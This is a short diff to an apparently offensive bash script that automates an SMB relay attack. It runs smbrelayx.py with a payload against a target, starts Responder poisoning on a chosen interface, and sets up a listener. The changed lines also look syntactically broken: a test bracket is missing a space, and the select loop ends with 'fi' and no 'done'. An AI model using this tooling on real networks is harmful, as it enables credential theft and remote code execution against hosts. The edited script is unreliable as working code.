@@ -116,13 +116,17 @@ smbrelayx.py -h $target -c "$payload"  >> ./relayer.log  &
 sleep 2
 
 echo ""
-echo "Select Interface to run Responder"
 
-iface=$(netstat -i | cut -d ' ' -f1 | sed 1,2d)
-select netiface in $iface ; do
-echo "Starting Responder on $netiface..."
-responder -I $netiface -wrfF >>relayer.log &
-break
+netstat -i | cut -d ' ' -f1 | sed 1,2d >> ./relayer.ifaces
+
+if [[ -s relayer.ifaces]]; then
+    echo "Select Interface to run Responder"
+    ifaces=$(<relayer.ifaces)
+    select netiface in $ifaces ; do
+    echo "Starting Responder on $netiface..."
+    responder -I $netiface -wrfF >>relayer.log &
+    break
+fi
 
 echo "Setting up listener..."
 
